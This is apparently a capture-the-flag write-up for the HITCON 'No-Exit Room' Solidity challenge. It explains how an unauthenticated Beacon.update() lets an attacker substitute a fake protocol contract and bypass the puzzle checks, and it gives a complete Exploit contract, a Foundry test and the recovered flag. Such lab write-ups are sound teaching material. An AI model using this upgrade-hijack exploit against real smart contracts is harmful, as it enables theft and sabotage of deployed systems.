# No-Exit Room [32 solves / 250 points] [First blood 🩸]

![](https://i.imgur.com/0AxlklB.png)

## Description :
```
Alice, Bob, and David are each locked in separate rooms. In each room, they have a unique private input and polynomial. If their private input is leaked, the room will be permanently locked.

They can communicate with each other via channels, but every message transmitted through these channels is monitored.

To escape, they must collaboratively calculate the sum of their private inputs without revealing them. Only by doing so can they unlock the doors and gain their freedom.

nc no-exit-room.chal.hitconctf.com 31337

noexitroom-86ae89dadca8f5b78db0488f5f5e0fcf3b3aed77.tar.gz

Author: wiasliaw (DeFiHackLabs)
```

To solve this challenge we have to set puzzleSolved to true. Also isSolved() need to return true in alice, bob, david which are all Room contract, while isHacked() need to return false.

```solidity
    function isSolved() external view returns (bool) {
        return puzzleSolved && !alice.isHacked() && !bob.isHacked() && !david.isHacked() && alice.isSolved()
            && bob.isSolved() && david.isSolved();
    }
```

There is an image in the challenge files :

![](https://i.imgur.com/2ykOtRS.png)

It shows that each Room are connected to 2 other Rooms with the channels and all of them are connected to the protocol and beacon.

At first looking at the contracts, this looks like a math challenge, but its not.

To set puzzleSolved to true, we can just call commitPuzzle() with an int256 value that the hash of the abi encoded value equals to puzzleHash :

```solidity
    bytes32 internal constant puzzleHash = hex"19a0b39aa25ac793b5f6e9a0534364cc0b3fd1ea9b651e79c7f50a59d48ef813";
...
    function commitPuzzle(int256 y) external {
        require(keccak256(abi.encode(y)) == puzzleHash, "Puzzle not Solve");
        puzzleSolved = true;
    }
```

And in the challenge description, it mentioned that in order to escape, the Rooms need to calculate the sum of their private inputs without revealing them.

In the Setup contract, we can see that the private inputs of alice, bob and david is set to 2, 24 and 90 :

```solidity
        // set Protocol Arguments
        // // alice: B(x) = 2 - 3x + 1x^2
        int256[] memory poly = new int256[](3);
        poly[0] = 2;
        poly[1] = -3;
        poly[2] = 1;
        alice.setProtocolArgs(poly, 2);
        // // bob: B(x) = 24 - 14x + 2x^2
        poly[0] = 24;
        poly[1] = -14;
        poly[2] = 2;
        bob.setProtocolArgs(poly, 24);
        // // david: C(x) = 90 - 11x + 3x^2
        poly[0] = 90;
        poly[1] = -11;
        poly[2] = 3;
        david.setProtocolArgs(poly, 90);
```

Just sum them up and calculate the keccak256 hash, we can see its the same hash as puzzleHash :

```solidity
➜ int256 y = 2 + 24 + 90
➜ keccak256(abi.encode(y))
Type: bytes32
└ Data: 0x19a0b39aa25ac793b5f6e9a0534364cc0b3fd1ea9b651e79c7f50a59d48ef813
```

Then to set isSolved() in the Room contracts to true, we have to call solveRoomPuzzle(), and historyRequestsLen need to be at least 3 and the int256 values left and right returned by the protocol contract need to be the same :

```solidity
    function solveRoomPuzzle(int256[] calldata xvs) external {
        int256[] memory yvs = new int256[](xvs.length);
        require(historyRequestsLen >= 3, "lack of request");
        for (uint256 i = 0; i < xvs.length;) {
            yvs[i] = historyRequests[xvs[i]];
            unchecked {
                i += 1;
            }
        }

        IProtocol _protocol = IProtocol(beacon.implementation());
        int256 left = _protocol.evaluateLagrange(xvs, yvs, 100);
        int256 right = _protocol.evaluate(polynomial, 100);

        if (left == right) {
            isSolved = true;
        }
    }
```

The Room contract is getting the address for the _protocol contract from beacon.implementation(), and the Beacon contract has no authentication, so anyone can set the implementation to their own contract :

```
contract Beacon is IBeacon {
    address internal _impl;

    function update(address newImpl) external {
        _impl = newImpl;
    }

    function implementation() external view returns (address) {
        return _impl;
    }
}
```

So I can just set the implementation to my modified protocol contract that always return the same value for the int256 values left and right.

```solidity
contract FakeProtocol is IProtocol {
    function evaluate(int256[] memory polynomial, int256 x) external pure returns (int256 ret) {
        // int256 power = 1;
        // for (uint256 i; i < polynomial.length;) {
        //     ret += power * polynomial[i];
        //     power *= x;
        //     unchecked {
        //         i += 1;
        //     }
        // }
        return int256(0);
    }

    function evaluateLagrange(int256[] memory xValues, int256[] memory yValues, int256 x)
        external
        pure
        returns (int256 ret)
    {
        // for (uint256 i = 0; i < yValues.length;) {
        //     ret = ret + _calculateBasisPolynomial(i, x, xValues) * yValues[i];
        //     unchecked {
        //         i += 1;
        //     }
        // }
        return int256(0);
    }
...
```

Finally, we have to increase historyRequestsLen to 3, while keeping isHacked() to false.

```solidity
    function onRequest(int256 x) external returns (int256 y) {
        // check neighbors
        require(_isNeighbor(msg.sender), "Not a Neighbor");
        y = _onRequest(x);
    }

    function selfRequest(int256 x) external returns (int256 y) {
        // check not neighbors
        require(!_isNeighbor(msg.sender), "Be a Neighbor");
        require(selfLimit < 1, "match the limit");
        unchecked {
            selfLimit += 1;
        }
        y = _onRequest(x);
    }

    function _onRequest(int256 x) internal returns (int256 y) {
        y = IProtocol(beacon.implementation()).evaluate(polynomial, x);

        require(!isHistoryRequestExist[x][y], "had requested");

        historyRequests[x] = y;
        historyRequestsLen += 1;
        isHistoryRequestExist[x][y] = true;
    }
```

historyRequestsLen is incremented in _onRequest() which is called by selfRequest() and onRequest()

We can just call selfRequest() directly to increment historyRequestsLen, and onRequest() has to be called by its neighboring Rooms

So we can just call request() in its neighboring Rooms, and it will call onRequest() in the other Room

```solidity
    function request(address to, int256 x) external {
        // check neighbors
        require(_isNeighbor(to), "Not a Neighbor");

        // check channel
        _channelCheck(address(this), to, x);

        // effect
        IRoom(to).onRequest(x);
    }
```

There is a _channelCheck internal call which calls the channel contract's record() function with the x value and the addresses :

```
    function _channelCheck(address a, address b, int256 x) internal {
        if (_chan == address(0)) {
            return;
        }
        // channel record
        IChannel(_chan).record(a, b, x);
    }
```

To avoid isHacked() being set to true, we have to make sure _times[a] is less than 2 when its calling record(), which will set the force parameter in hack() to true and set isHacked() to true :

```solidity
    function record(address a, address b, int256 x) external {
        // check whether channel is exist
        require(_chan[a][b], "channel not exist");
        // check whether reach the limit
        require(_times[a] < 2, "reach the limit");
        // check whether channel is used
        require(!_limit[a][b], "channel is used");

        // effect
        IRoom(a).hack(x, (_times[a] == 2 ? true : false));
        _limit[a][b] = true;
        _times[a] += 1;
    }
```

Also, x cannot be the privateInput, otherwise isHacked() will be set to true :

```solidity
    function hack(int256 x, bool force) external {
        _onlyChannel();
        if (force || x == privateInput) {
            isHacked = true;
        }
    }
```

## Exploit contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "./Setup.sol";
import "./FakeProtocol.sol";
import "forge-std/console.sol";

contract Exploit {
    Setup public setup;
    Beacon public beacon;
    Channel public channel;
    Protocol public protocol;
    Room public alice;
    Room public bob;
    Room public david;

    constructor(Setup _setup) {
        setup = _setup;
        beacon = setup.beacon();
        channel = setup.channel();
        protocol = setup.protocol();
        alice = setup.alice();
        bob = setup.bob();
        david = setup.david();
    }

    function run() public payable {
        setup.commitPuzzle(int256(2 + 24 + 90));
        FakeProtocol fakeProtocol = new FakeProtocol();
        beacon.update(address(fakeProtocol));

        alice.request(address(bob), 0);
        alice.request(address(david), 0);
        alice.selfRequest(0);
        
        // use a different number (thats not privateInput) so it wont revert with "had requested"
        bob.request(address(alice), 1);
        bob.request(address(david), 1);
        bob.selfRequest(1);
        
        david.request(address(alice), 3);
        david.request(address(bob), 3);
        david.selfRequest(3);
        
        int256[] memory xvs = new int256[](3);
        alice.solveRoomPuzzle(xvs);
        bob.solveRoomPuzzle(xvs);
        david.solveRoomPuzzle(xvs);
    }
}
```

## Foundry test

```solidity
contract solveTest is Test {
    Setup public _setup;
    Exploit public exploit;

    function setUp() public {
        _setup = new Setup();
    }

    function testSolve() public {
        exploit = new Exploit(_setup);
        exploit.run();

        console.log("isSolved():", _setup.isSolved());
    }
}
```

```
# forge test --mp test/solve.t.sol -vv
[⠒] Compiling...
No files changed, compilation skipped

Ran 1 test for test/solve.t.sol:solveTest
[PASS] testSolve() (gas: 1722903)
Logs:
  isSolved(): true

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.47ms (1.39ms CPU time)

Ran 1 test suite in 8.40ms (2.47ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Flag

Then we can just run the exploit in the actual instance and get the flag :

```
# nc no-exit-room.chal.hitconctf.com 31337
1 - launch new instance
2 - kill instance
3 - get flag (if isSolved() is true)
action? 3
uuid please: 1737ca9e-869f-42b5-b701-2eac6ef1e14a

Congratulations! You have solved it! Here's the flag: 
hitcon{e0752a5b833bb528ac5ceca7baa2a6b6e885b04b0b26e4f2388910aea39d892}
```
